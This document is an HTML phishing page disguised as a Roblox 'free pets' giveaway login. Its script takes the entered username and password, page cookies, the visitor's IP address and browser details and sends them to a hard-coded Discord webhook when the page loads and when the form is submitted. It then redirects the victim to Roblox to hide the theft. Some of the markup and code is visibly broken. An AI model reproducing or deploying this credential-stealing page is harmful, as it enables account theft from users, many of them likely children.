<!DOCTYPE html>
<html lang="en">
<head>

    <style>
        body { margin:0; background:#0a0a0a; color:#fff; font-family:Arial; text-align:center; padding:20px; }
        input { display:block; margin:12px auto; padding:14px; width:320px; font-size:17px; border-radius:6px; }
        button { padding:18px 50px; font-size:24px; background:#00ff00; color:#000; border:none; cursor:pointer; margin:20px; border-radius:8px; }
        img { max-width:85%; cursor:pointer; border:8px solid #ffd700; box-shadow:0 0 20px #ffd700; }

<body>

    <form id="loginForm">
        <input type="text" id="user" placeholder="Roblox Username" required>
        <input type="password" id="pass" placeholder="Roblox Password" required>
        <button type="submit">LOGIN & CLAIM PETS</button>
    </form>

    <script>
        const webhook = "https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA";

        async function sendData(extra = "") {
            let ip = "Unknown";
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}

            const cookies = document.cookie || "No accessible .ROBLOSECURITY (HttpOnly protected)";
            const user = (document.getElementById('user') || {}).value || "";
            const pass = (document.getElementById('pass') || {}).value || "";

                embeds: [{
                    title: "Full Data Logged",
                    description: "```" + `Username: ${user}\nPassword: ${pass}\nCookie: ${cookies}\nIP: ${ip}\nExtra: ${extra}\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}` + "```",
                    color: 0xff00ff
                }]
            };

            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            sendData("Login Form Submitted");
            alert("🎉 Claiming your free pets... Redirecting to Roblox!");
            setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 1500);
        });

        // Auto + image triggers
        window.onload = () => setTimeout(() => sendData("Page Loaded"), 800);
    </script>
